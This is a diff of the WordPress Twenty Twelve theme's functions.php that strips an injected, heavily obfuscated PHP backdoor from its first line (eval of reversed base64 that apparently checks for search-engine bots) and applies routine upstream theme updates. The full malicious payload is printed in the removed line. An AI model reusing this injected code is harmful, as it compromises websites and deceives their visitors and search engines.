@@ -1,4 +1,4 @@
-<?php $eylrme="\x63"."r".chr(101).chr(97)."\x74"."e".chr(95).chr(102)."\x75"."n"."c".chr(116)."i".chr(111)."\x6e";$kjkydn = $eylrme('$a',strrev(';)a$(lave')); $kjkydn(strrev(';))"=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"(edoced_46esab(lave'));?><?php
+<?php
 /**
  * Twenty Twelve functions and definitions
  *
@@ -6,8 +6,8 @@
  * in the theme as custom template tags. Others are attached to action and
  * filter hooks in WordPress to change core functionality.
  *
- * When using a child theme (see http://codex.wordpress.org/Theme_Development and
- * http://codex.wordpress.org/Child_Themes), you can override certain functions
+ * When using a child theme (see https://codex.wordpress.org/Theme_Development and
+ * https://codex.wordpress.org/Child_Themes), you can override certain functions
  * (those wrapped in a function_exists() call) by defining them first in your child theme's
  * functions.php file. The child theme's functions.php file is included before the parent
  * theme's file, so the child theme functions would be used.
@@ -15,7 +15,7 @@
  * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
  * to a filter or action hook.
  *
- * For more information on hooks, actions, and filters, @link http://codex.wordpress.org/Plugin_API
+ * For more information on hooks, actions, and filters, @link https://codex.wordpress.org/Plugin_API
  *
  * @package WordPress
  * @subpackage Twenty_Twelve
@@ -74,6 +74,9 @@ function twentytwelve_setup() {
 	// This theme uses a custom image size for featured images, displayed on "standard" posts.
 	add_theme_support( 'post-thumbnails' );
 	set_post_thumbnail_size( 624, 9999 ); // Unlimited height, soft crop
+
+	// Indicate widget sidebars can use selective refresh in the Customizer.
+	add_theme_support( 'customize-selective-refresh-widgets' );
 }
 add_action( 'after_setup_theme', 'twentytwelve_setup' );
 
@@ -113,23 +116,20 @@ function twentytwelve_get_font_url() {
 		elseif ( 'vietnamese' == $subset )
 			$subsets .= ',vietnamese';
 
-		$protocol = is_ssl() ? 'https' : 'http';
 		$query_args = array(
 			'family' => 'Open+Sans:400italic,700italic,400,700',
 			'subset' => $subsets,
 		);
-		$font_url = add_query_arg( $query_args, "$protocol://fonts.googleapis.com/css" );
+		$font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
 	}
 
 	return $font_url;
 }
 
 /**
- * Enqueue scripts and styles for front-end.
+ * Enqueue scripts and styles for front end.
  *
  * @since Twenty Twelve 1.0
- *
- * @return void
  */
 function twentytwelve_scripts_styles() {
 	global $wp_styles;
@@ -142,7 +142,7 @@ function twentytwelve_scripts_styles() {
 		wp_enqueue_script( 'comment-reply' );
 
 	// Adds JavaScript for handling the navigation menu hide-and-show behavior.
-	wp_enqueue_script( 'twentytwelve-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '1.0', true );
+	wp_enqueue_script( 'twentytwelve-navigation', get_template_directory_uri() . '/js/navigation.js', array( 'jquery' ), '20140711', true );
 
 	$font_url = twentytwelve_get_font_url();
 	if ( ! empty( $font_url ) )
@@ -203,7 +203,7 @@ function twentytwelve_wp_title( $title, $sep ) {
 		return $title;
 
 	// Add the site name.
-	$title .= get_bloginfo( 'name' );
+	$title .= get_bloginfo( 'name', 'display' );
 
 	// Add the site description for the home/front page.
 	$site_description = get_bloginfo( 'description', 'display' );
@@ -211,7 +211,7 @@ function twentytwelve_wp_title( $title, $sep ) {
 		$title = "$title $sep $site_description";
 
 	// Add a page number if necessary.
-	if ( $paged >= 2 || $page >= 2 )
+	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() )
 		$title = "$title $sep " . sprintf( __( 'Page %s', 'twentytwelve' ), max( $paged, $page ) );
 
 	return $title;
@@ -281,14 +281,12 @@ if ( ! function_exists( 'twentytwelve_content_nav' ) ) :
 function twentytwelve_content_nav( $html_id ) {
 	global $wp_query;
 
-	$html_id = esc_attr( $html_id );
-
 	if ( $wp_query->max_num_pages > 1 ) : ?>
-		<nav id="<?php echo $html_id; ?>" class="navigation" role="navigation">
+		<nav id="<?php echo esc_attr( $html_id ); ?>" class="navigation" role="navigation">
 			<h3 class="assistive-text"><?php _e( 'Post navigation', 'twentytwelve' ); ?></h3>
 			<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'twentytwelve' ) ); ?></div>
 			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'twentytwelve' ) ); ?></div>
-		</nav><!-- #<?php echo $html_id; ?> .navigation -->
+		</nav><!-- .navigation -->
 	<?php endif;
 }
 endif;
@@ -303,8 +301,6 @@ if ( ! function_exists( 'twentytwelve_comment' ) ) :
  * Used as a callback by wp_list_comments() for displaying the comments.
  *
  * @since Twenty Twelve 1.0
- *
- * @return void
  */
 function twentytwelve_comment( $comment, $args, $depth ) {
 	$GLOBALS['comment'] = $comment;
@@ -368,8 +364,6 @@ if ( ! function_exists( 'twentytwelve_entry_meta' ) ) :
  * Create your own twentytwelve_entry_meta() to override in a child theme.
  *
  * @since Twenty Twelve 1.0
- *
- * @return void
  */
 function twentytwelve_entry_meta() {
 	// Translators: used between list items, there is a space after the comma.
@@ -467,8 +461,6 @@ add_filter( 'body_class', 'twentytwelve_body_class' );
  * templates, and when there are no active widgets in the sidebar.
  *
  * @since Twenty Twelve 1.0
- *
- * @return void
  */
 function twentytwelve_content_width() {
 	if ( is_page_template( 'page-templates/full-width.php' ) || is_attachment() || ! is_active_sidebar( 'sidebar-1' ) ) {
@@ -486,14 +478,50 @@ add_action( 'template_redirect', 'twentytwelve_content_width' );
  * @since Twenty Twelve 1.0
  *
  * @param WP_Customize_Manager $wp_customize Customizer object.
- * @return void
  */
 function twentytwelve_customize_register( $wp_customize ) {
 	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
 	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
 	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
+
+	if ( isset( $wp_customize->selective_refresh ) ) {
+		$wp_customize->selective_refresh->add_partial( 'blogname', array(
+			'selector' => '.site-title > a',
+			'container_inclusive' => false,
+			'render_callback' => 'twentytwelve_customize_partial_blogname',
+		) );
+		$wp_customize->selective_refresh->add_partial( 'blogdescription', array(
+			'selector' => '.site-description',
+			'container_inclusive' => false,
+			'render_callback' => 'twentytwelve_customize_partial_blogdescription',
+		) );
+	}
 }
 add_action( 'customize_register', 'twentytwelve_customize_register' );
+
+/**
+ * Render the site title for the selective refresh partial.
+ *
+ * @since Twenty Twelve 2.0
+ * @see twentytwelve_customize_register()
+ *
+ * @return void
+ */
+function twentytwelve_customize_partial_blogname() {
+	bloginfo( 'name' );
+}
+
+/**
+ * Render the site tagline for the selective refresh partial.
+ *
+ * @since Twenty Twelve 2.0
+ * @see twentytwelve_customize_register()
+ *
+ * @return void
+ */
+function twentytwelve_customize_partial_blogdescription() {
+	bloginfo( 'description' );
+}
 
 /**
  * Enqueue Javascript postMessage handlers for the Customizer.
@@ -501,10 +529,8 @@ add_action( 'customize_register', 'twentytwelve_customize_register' );
  * Binds JS handlers to make the Customizer preview reload changes asynchronously.
  *
  * @since Twenty Twelve 1.0
- *
- * @return void
  */
 function twentytwelve_customize_preview_js() {
-	wp_enqueue_script( 'twentytwelve-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130301', true );
+	wp_enqueue_script( 'twentytwelve-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20141120', true );
 }
 add_action( 'customize_preview_init', 'twentytwelve_customize_preview_js' );
